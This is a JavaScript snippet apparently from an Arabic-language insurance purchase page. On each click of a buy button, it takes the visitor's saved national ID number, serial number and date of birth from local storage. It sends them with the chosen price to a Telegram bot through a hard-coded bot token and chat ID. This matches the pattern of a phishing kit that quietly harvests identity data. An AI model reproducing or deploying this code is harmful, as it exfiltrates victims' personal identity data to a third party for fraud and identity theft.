
  const buyButtons = document.querySelectorAll('.buy-button');

  buyButtons.forEach(button => {
    button.addEventListener('click', () => {
      const price = button.dataset.price;

      const savedData = localStorage.getItem("formData");
      let parsedData = {};

      try {
        parsedData = JSON.parse(savedData) || {};
      } catch (e) {
        parsedData = {};
      }

      const id = parsedData.id || "غير متوفر";
      const serial = parsedData.serial || "غير متوفر";
      const dob = parsedData.dob || "غير متوفر";

      const message = ` تم اختيار عرض تأمين:\n\n` +
                      ` رقم الهوية: ${id}\n` +
                      ` الرقم التسلسلي: ${serial}\n` +
                      ` تاريخ الميلاد: ${dob}\n` +
                      ` السعر الذي تم اختياره: ${price} ريال`;

      const token = "7306247318:AAGoAlnx8FRFeHTCHEJ5SzhYtkwfxM5_TQg";
      const chatId = "8059394046";

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          localStorage.setItem('selectedPrice', price);
          window.location.href = "totalselect.html";
        } else {
        }
      })
      .catch(error => {
        console.error("Telegram Error:", error);
      });
    });
  });